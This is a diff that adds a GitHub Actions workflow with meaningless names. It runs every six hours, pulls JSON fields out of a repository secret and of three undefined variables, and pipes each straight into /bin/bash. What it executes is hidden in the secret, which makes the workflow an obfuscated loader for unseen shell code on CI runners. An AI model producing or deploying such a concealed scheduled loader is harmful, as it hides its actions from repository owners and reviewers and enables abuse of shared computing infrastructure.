@@ -1,0 +1,21 @@
+name: kaigonbtai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kaigonbtai
+        env:
+          ioixh44553: ${{ secrets.ioixh44553 }}
+        run: |
+          echo $ioixh44553 | jq -r .ze8914 | /bin/bash
+          echo $xzz5 | jq -r .oet28 | /bin/bash
+          echo $wg3 | jq -r .zaav53868 | /bin/bash
+          echo $lgqqx5 | jq -r .khmct0588 | /bin/bash
+
